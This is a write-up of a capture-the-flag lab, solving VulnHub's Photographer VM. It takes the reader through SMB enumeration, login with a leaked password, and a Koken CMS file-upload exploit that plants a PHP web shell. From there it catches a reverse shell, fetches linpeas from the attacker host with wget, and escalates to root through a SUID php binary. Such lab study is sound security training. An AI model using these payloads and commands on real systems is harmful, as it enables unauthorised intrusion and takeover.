---
layout: page
title: Photographer
description: Photographer from Vulnhub.
img: 
importance: 4
category: VulnHub
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="assets/img/photographer/logo.png" title="VulnHub Photographer Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
<h2>Link</h2>
<a href="https://www.vulnhub.com/entry/photographer-1,519/">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
Giving Photographer from VulnHub.

Run netdiscover to find the machine on the network.

{% raw %}
```sh
 Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                                                                            
                                                                                                                                                                                                                                          
 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180                                                                                                                                                                          
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.0.0.1        0a:00:27:00:00:1b      1      60  Unknown vendor                                                                                                                                                                         
 10.0.0.2        08:00:27:d2:7f:7f      1      60  PCS Systemtechnik GmbH                                                                                                                                                                 
 10.0.0.15       08:00:27:2f:84:a3      1      60  PCS Systemtechnik GmbH
```
{% endraw %}

<br />
Run nmap to determine the open ports and services.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/vulnhub/photograph]
└─$ sudo nmap -sC -sV -A -O -oN nmap 10.0.0.15    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-31 15:39 AEDT
Nmap scan report for 10.0.0.15
Host is up (0.00025s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Photographer by v1n1v131r4
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8000/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: daisa ahomi
|_http-generator: Koken 0.22.24
MAC Address: 08:00:27:2F:84:A3 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
Network Distance: 1 hop
Service Info: Host: PHOTOGRAPHER

Host script results:
| smb2-time: 
|   date: 2025-01-31T04:40:12
|_  start_date: N/A
|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: 0s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: photographer
|   NetBIOS computer name: PHOTOGRAPHER\x00
|   Domain name: \x00
|   FQDN: photographer
|_  System time: 2025-01-30T23:40:12-05:00
|_nbstat: NetBIOS name: PHOTOGRAPHER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

TRACEROUTE
HOP RTT     ADDRESS
1   0.25 ms 10.0.0.15

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.89 seconds
```
{% endraw %}

<br />
Run nmap with the vuln script category.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/vulnhub/photograph]
└─$ cat vulnchk                    
# Nmap 7.95 scan initiated Fri Jan 31 15:40:28 2025 as: /usr/lib/nmap/nmap --script vuln -oN vulnchk 10.0.0.15

<snip>

| http-enum: 
|   /admin/: Possible admin folder
|   /admin/index.html: Possible admin folder
|   /app/: Potentially interesting folder
|   /content/: Potentially interesting folder
|   /error/: Potentially interesting folder
|   /home/: Potentially interesting folder
|_  /index/: Potentially interesting folder

<snip>
```
{% endraw %}

<br />
List all of the shares on the SMB.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/vulnhub/photograph]
└─$ smbclient -L //10.0.0.15/                 
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        sambashare      Disk      Samba on Ubuntu
        IPC$            IPC       IPC Service (photographer server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            PHOTOGRAPHER
```
{% endraw %}

<br />
Connect to the sambashare share and list its contents.  Get a copy of the two files that are list in the share.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/vulnhub/photograph]
└─$ smbclient //10.0.0.15/sambashare
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jul 21 11:30:07 2020
  ..                                  D        0  Tue Jul 21 19:44:25 2020
  mailsent.txt                        N      503  Tue Jul 21 11:29:40 2020
  wordpress.bkp.zip                   N 13930308  Tue Jul 21 11:22:23 2020

                278627392 blocks of size 1024. 264268400 blocks available
smb: \> get mailsent.txt
getting file \mailsent.txt of size 503 as mailsent.txt (245.6 KiloBytes/sec) (average 245.6 KiloBytes/sec)
smb: \> get wordpress.bkp.zip
getting file \wordpress.bkp.zip of size 13930308 as wordpress.bkp.zip (160044.7 KiloBytes/sec) (average 156371.4 KiloBytes/sec)
```
{% endraw %}

<br />
Check the contents of the mailsent.txt.  Note that there is a secret somewhere.  Neat.  There are also two names and two emails that should also be noted.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/vulnhub/photograph]
└─$ cat mailsent.txt 
Message-ID: <4129F3CA.2020509@dc.edu>
Date: Mon, 20 Jul 2020 11:40:36 -0400
From: Agi Clarence <agi@photographer.com>
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0
X-Accept-Language: en-us, en
MIME-Version: 1.0
To: Daisa Ahomi <daisa@photographer.com>
Subject: To Do - Daisa Website's
Content-Type: text/plain; charset=us-ascii; format=flowed
Content-Transfer-Encoding: 7bit

Hi Daisa!
Your site is ready now.
Don't forget your secret, my babygirl ;)
```
{% endraw %}

<br />
Check the landing page on port 80.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/photographer/landing80.png" title="Check the Landing Page on Port 80" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the landing page source code on port 80.

{% raw %}
```sh
view-source:http://10.0.0.15/

<!DOCTYPE HTML>
<!--
	Photographer by v1n1v131r4
	-->
<html>
	<head>
		<title>Photographer by v1n1v131r4</title>
		<meta charset="utf-8" />
		<meta name="viewport" content="width=device-width, initial-scale=1" />
		<link rel="stylesheet" href="assets/css/main.css" />
	</head>
	<body>

    <snip>

    </body>
</html>
```
{% endraw %}

<br />
Check the landing page on port 8000.  Notice the Koken CMS installation that is running on port 8000.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/photographer/landing8000.png" title="Check the Landing Page on Port 8000" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the Exploit-DB for an exploit for the Koken installation.

{% raw %}
```sh
https://www.exploit-db.com/exploits/48706

# Exploit Title: Koken CMS 0.22.24 - Arbitrary File Upload (Authenticated)
# Date: 2020-07-15
# Exploit Author: v1n1v131r4
# Vendor Homepage: http://koken.me/
# Software Link: https://www.softaculous.com/apps/cms/Koken
# Version: 0.22.24
# Tested on: Linux
# PoC: https://github.com/V1n1v131r4/Bypass-File-Upload-on-Koken-CMS/blob/master/README.md

The Koken CMS upload restrictions are based on a list of allowed file extensions (withelist), which facilitates bypass through the handling of the HTTP request via Burp.

Steps to exploit:

1. Create a malicious PHP file with this content:

   <?php system($_GET['cmd']);?>

2. Save as "image.php.jpg"

3. Authenticated, go to Koken CMS Dashboard, upload your file on "Import Content" button (Library panel) and send the HTTP request to Burp.

4. On Burp, rename your file to "image.php"


POST /koken/api.php?/content HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://target.com/koken/admin/
x-koken-auth: cookie
Content-Type: multipart/form-data; boundary=---------------------------2391361183188899229525551
Content-Length: 1043
Connection: close
Cookie: PHPSESSID= [Cookie value here]

-----------------------------2391361183188899229525551
Content-Disposition: form-data; name="name"

image.php
-----------------------------2391361183188899229525551
Content-Disposition: form-data; name="chunk"

0
-----------------------------2391361183188899229525551
Content-Disposition: form-data; name="chunks"

1
-----------------------------2391361183188899229525551
Content-Disposition: form-data; name="upload_session_start"

1594831856
-----------------------------2391361183188899229525551
Content-Disposition: form-data; name="visibility"

public
-----------------------------2391361183188899229525551
Content-Disposition: form-data; name="license"

all
-----------------------------2391361183188899229525551
Content-Disposition: form-data; name="max_download"

none
-----------------------------2391361183188899229525551
Content-Disposition: form-data; name="file"; filename="image.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']);?>

-----------------------------2391361183188899229525551--



5. On Koken CMS Library, select you file and put the mouse on "Download File" to see where your file is hosted on server.
```
{% endraw %}

<br />
Check the admin directory and view the login page.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/photographer/admin.png" title="Check the admin section" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
curl -I http://10.0.0.15:8000 to see what information can be gleaned from the headers.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/vulnhub/photograph]
└─$ curl -I http://10.0.0.15:8000                                                                                                        
HTTP/1.1 200 OK
Date: Fri, 31 Jan 2025 05:08:44 GMT
Server: Apache/2.4.18 (Ubuntu)
X-XHR-Current-Location: http://10.0.0.15:8000/
Content-Type: text/html; charset=UTF-8
```
{% endraw %}

<br />
Unzip the Wordpress zip file from the SMB.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/vulnhub/photograph/wp]
└─$ unzip ../wordpress.bkp.zip 
Archive:  ../wordpress.bkp.zip
   creating: wordpress/
  inflating: wordpress/wp-login.php  
  inflating: wordpress/wp-cron.php   
  inflating: wordpress/xmlrpc.php    
  inflating: wordpress/wp-load.php   

  <snip>
```
{% endraw %}

<br />
Check the wp-config-sample.php for a potential password.

{% raw %}
```php
<?php
/**
 * As configurações básicas do WordPress 

  <snip>

  // ** Configurações do MySQL - Você pode pegar estas informações com o serviço de hospedagem ** //
/** O nome do banco de dados do WordPress */
define( 'DB_NAME', 'nome_do_banco_de_dados_aqui' );

/** Usuário do banco de dados MySQL */
define( 'DB_USER', 'nome_de_usuario_aqui' );

/** Senha do banco de dados MySQL */
define( 'DB_PASSWORD', 'senha_aqui' );

/** Nome do host do MySQL */
define( 'DB_HOST', 'localhost' );

/** Charset do banco de dados a ser usado na criação das tabelas. */
define( 'DB_CHARSET', 'utf8' );

/** O tipo de Collate do banco de dados. Não altere isso se tiver dúvidas. */
define( 'DB_COLLATE', '' );

<snip>
```
{% endraw %}

<br />
Ffuf the website on port 80.

{% raw %}
```sh
┌──(kali㉿kali)-[~/…/photograph/wp/wordpress/wp-content]
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.0.0.15/FUZZ -e .txt,.bak,.html,.php -fs 5711

<snip>

.php                    [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 1ms]
images                  [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 0ms]
.html                   [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 1ms]
assets                  [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 2ms]
generic.html            [Status: 200, Size: 4243, Words: 389, Lines: 83, Duration: 29ms]
elements.html           [Status: 200, Size: 19831, Words: 1279, Lines: 459, Duration: 12ms]
.html                   [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 9ms]
.php                    [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 10ms]
server-status           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 8ms]
:: Progress: [1102795/1102795] :: Job [1/1] :: 3225 req/sec :: Duration: [0:03:51] :: Errors: 0 ::
```
{% endraw %}

<br />
Ffuf the website on port 8000.

{% raw %}
```sh
┌──(kali㉿kali)-[~/…/photograph/wp/wordpress/wp-content]
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.0.0.15:8000/FUZZ -e .txt,.bak,.html -fs 4708 -fw 1

<snip>

.html                   [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 5ms]
admin                   [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 3ms]
storage                 [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 19ms]
app                     [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 8ms]
http%3A.txt             [Status: 200, Size: 4683, Words: 207, Lines: 99, Duration: 647ms]
http%3A.html            [Status: 200, Size: 4686, Words: 207, Lines: 99, Duration: 651ms]
http%3A.bak             [Status: 200, Size: 4683, Words: 207, Lines: 99, Duration: 766ms]
.html                   [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 100ms]
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 38ms]
:: Progress: [882236/882236] :: Job [1/1] :: 491 req/sec :: Duration: [0:32:33] :: Errors: 0 ::
```
{% endraw %}

<br />
Login using the daisa email and babygirl from the email body.  We had the "secret" all along.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/photographer/librarylanding.png" title="Check the Landing Page when we login" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Create image.php.jpg file that is indicated in the exploit.

{% raw %}
```php
<?php system($_GET['cmd']);?>
```
{% endraw %}

<br />
Click on Import content in the lower right-hand corner.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/photographer/import.png" title="Click Import Content" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Choose the file that was just created.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/photographer/fileselect.png" title="Select File" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Ensure that you intercept the request.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/photographer/intercept.png" title="Ensure Intercept is On" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Upload the file.  Check that we caught the request.  Update the request to remove the .jpg extension from two different places in the request.

{% raw %}
```sh
POST /api.php?/content HTTP/1.1
Host: 10.0.0.15:8000
Content-Length: 928
x-koken-auth: cookie
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydjT9BT6fKT3BUBDZ
Accept: */*
Origin: http://10.0.0.15:8000
Referer: http://10.0.0.15:8000/admin/
Accept-Encoding: gzip, deflate, br
Cookie: koken_session_ci=u1YR5VZ8znra9LIUkLILlGecmHce75FKV5DWXBbk7uYYqfgn3SfP%2Fv%2F%2BlcvdflHe%2F68Nu9NLLMMU%2B1%2Fotwnv90r%2BlfToAK%2BQoG8SQNPUvfy8nm7kpSypm9caLceaSjszFBWwEYsxMCYj1TtOz4VtIK50XSQatWYQ5t4WcvnqsjdQLn0woHnn0m8P2Hj0gQTeD4hEZb3pFwPV%2BY1vrsNnMDnA3VxGaVwO9HRyPLg5lOdfIbyVeGOInZPlnAMiUychWMUoGyFYTuwH2fOrLygXzyEyTaCLpskaWRBek6KLNrf2P9n368BIsd47RE5fdsSauyb4%2FEHrTazlrT9S7qQ1UjXMlWcmxXpBfbb4KMbqjULQZyjukALxaOyWPuFTPGv%2F9ZMHXeiUycfNvgA9nbDRJrQgURy5F9jx%2FdgFhctZoi4Al%2B9GRZWOip3vP%2BiRM4ZHQkCH2iZfMY2JkDAFR8cTQbqj4NYs3eEO5KMMHkyTDy3S9qFIFbd7olPOoOumelKw%2Fbq8G4A1osKMvZNsnzPPXwtd8E5aPQqFbB2oVUi4pXgrlFcXgB2jDyh3pWO7cd7z13I3uWOk3Anc4dCKqZvF7o7ChUbh8bPX7oyKA2k8NvpkjVMt%2BQBRdbMrDP8Et3OM%2FmFR4cksEVxv3m9cai8XFvytgpRKKcyqGa%2FzKo16OFLdlZFMWZuXLtCcsadOq2aK1%2BHgFbY%2BFhJas8PLy%2BIvFVKDeoTbYSRL83wc6UJg0aaI%2BD5sj9FC3pIe9OpqPFGlgPOdiVhXYenGpkAJwRUl5xVBJJff8rNkXkPdX6zKMfFxv9eppydOkRLc5ON%2Bw5AE2M12zraTlGLcfVmywe9m6TEEo31KrJq8iXH39XojBnGvnTB6W6ZixhYvYVEy6OVhhqT49PKTqnxH3wOdn%2Fi7gRsIZkTwv9LPBdl%2BzdkVuT3LnUqGTU5m8bMgWM0sI8slhcCESCMy4sRMMYATv9XPNaNVzmRpXgO%2FJze%2FNMk9M5y4RePiaOT0svglmLBbuus3wSHWkZRZMwHpC2Hp7HtF5F7DdwVs7E4nCmW5GcjLRQbG%2BKd%2B6lEZ2u96NafGk%2BXufakMz5qv52ulSWUCdMYGGl49L0oRGG8oGrHmJ2WOO%2B%2B9w8ch2a5z3h1sndkBs760zYgv1Ptwfu4refz5ol6OyufqwwAIipAogoEA9ayNw9RkC1PUSbuSdG%2FT7mbCvf9078zSM2Gyua6JUVlNFItSq6VfArs57oHnN8K%2FCCP0S6gmYrnISL2PYcau8O%2FCSjZTmDLjgFiAnzU4WKs6%2FAmxjzayQSRtQLiw9dT744GrwvV2gwc1VeO4FPpiq59rgy%2BY4152d83683f8449982019921a126c94440322d38
Connection: keep-alive

------WebKitFormBoundarydjT9BT6fKT3BUBDZ
Content-Disposition: form-data; name="name"

image.php
------WebKitFormBoundarydjT9BT6fKT3BUBDZ
Content-Disposition: form-data; name="chunk"

0
------WebKitFormBoundarydjT9BT6fKT3BUBDZ
Content-Disposition: form-data; name="chunks"

1
------WebKitFormBoundarydjT9BT6fKT3BUBDZ
Content-Disposition: form-data; name="upload_session_start"

1738324309
------WebKitFormBoundarydjT9BT6fKT3BUBDZ
Content-Disposition: form-data; name="visibility"

public
------WebKitFormBoundarydjT9BT6fKT3BUBDZ
Content-Disposition: form-data; name="license"

all
------WebKitFormBoundarydjT9BT6fKT3BUBDZ
Content-Disposition: form-data; name="max_download"

none
------WebKitFormBoundarydjT9BT6fKT3BUBDZ
Content-Disposition: form-data; name="file"; filename="image.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']);?>

------WebKitFormBoundarydjT9BT6fKT3BUBDZ--
```
{% endraw %}

<br />
Forward the request on to upload our malicious php file.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/photographer/forward.png" title="Forward Request" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Watch the traffic that comes through the interceptor.  Note the location of our php file.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/photographer/traffic.png" title="Watch Traffic" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Test the path from the traffic with id for the cmd parameter to test command execution.

{% raw %}
```sh
http://10.0.0.15:8000/storage/originals/7d/17/image.php?cmd=id
```
{% endraw %}
<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/photographer/id.png" title="Command Execution" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Start a listener.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/vulnhub/photograph]
└─$ sudo nc -nlvp 443                         
[sudo] password for kali: 
listening on [any] 443 ...
```
{% endraw %}

<br />
Use Revshells to generate a Python3 payload.

{% raw %}
```sh
https://www.revshells.com/
```
{% endraw %}
<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/photographer/revshells.png" title="Revshells" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Use the python3 payload from revshells and paste in into the cmd parameter.  Execute it.  Check the listener and catch the shell.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/vulnhub/photograph]
└─$ sudo nc -nlvp 443                         
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.0.0.14] from (UNKNOWN) [10.0.0.15] 41394
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@photographer:/var/www/html/koken/storage/originals/7d/17$
```
{% endraw %}

<br />
Get the user.txt flag.

{% raw %}
```sh
cat user.txt
<redacted>
www-data@photographer:/home/daisa$ ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:2f:84:a3 brd ff:ff:ff:ff:ff:ff
    inet 10.0.0.15/24 brd 10.0.0.255 scope global dynamic enp0s3
       valid_lft 589sec preferred_lft 589sec
    inet6 fe80::6c05:5fdd:681b:cd25/64 scope link 
       valid_lft forever preferred_lft forever
```
{% endraw %}

<br />
Copy linpeas.sh into the local working folder and start a python web server to serve the script.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/vulnhub/photograph]
└─$ cp `locate linpeas.sh` .                                                            
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/vulnhub/photograph]
└─$ python3 -m http.server               
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
{% endraw %}

<br />
Transfer the results to the victim machine.

{% raw %}
```sh
www-data@photographer:/dev/shm$ wget 10.0.0.14:8000/linpeas.sh
wget 10.0.0.14:8000/linpeas.sh
--2025-01-31 07:22:25--  http://10.0.0.14:8000/linpeas.sh
Connecting to 10.0.0.14:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 839766 (820K) [text/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh          100%[===================>] 820.08K  --.-KB/s    in 0.002s  

2025-01-31 07:22:25 (410 MB/s) - 'linpeas.sh' saved [839766/839766]

www-data@photographer:/dev/shm$ chmod +x linpeas.sh
chmod +x linpeas.shs
```
{% endraw %}

<br />
Run linpeas and review the results.  Notice that the php binary has the sticky bit.

{% raw %}
```sh
www-data@photographer:/dev/shm$ ./linpeas.sh
./linpeas.sh



                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

<snip>

                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                                                                                                          
                      ╚════════════════════════════════════╝                                                                                                                                                                                
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                                                                                             
-rwsr-xr-- 1 root messagebus 42K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                                                                                   
-rwsr-xr-x 1 root root 10K Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-sr-x 1 root root 11K Oct 25  2018 /usr/lib/xorg/Xorg.wrap
-rwsr-xr-x 1 root root 109K Jul 10  2020 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-x 1 root root 419K Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 19K Mar 18  2017 /usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
-rwsr-xr-x 1 root root 15K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-- 1 root dip 386K Feb 11  2020 /usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-xr-x 1 root root 23K Mar 27  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)/Generic_CVE-2021-4034
-rwsr-xr-x 1 root root 53K May 16  2017 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 39K May 16  2017 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 74K May 16  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 4.7M Jul  9  2020 /usr/bin/php7.2 (Unknown SUID binary!)
-rwsr-xr-x 1 root root 134K Jan 31  2020 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 40K May 16  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 49K May 16  2017 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 44K May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 31K Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 40K May 16  2018 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 27K May 16  2018 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 40K May 16  2017 /bin/su

<snip>
```
{% endraw %}

<br />
Check the GTFOBins for a potential SUID privelege escalation.

{% raw %}
```sh
https://gtfobins.github.io/gtfobins/php/
```
{% endraw %}
<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/photographer/gtfo.png" title="GTFOBins" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Use the php binary to escalate your privilege.

{% raw %}
```sh
www-data@photographer:/dev/shm$ /usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
<shm$ /usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"                    
# whoami
whoami
root
```
{% endraw %}

<br />
Get the root.txt flag.

{% raw %}
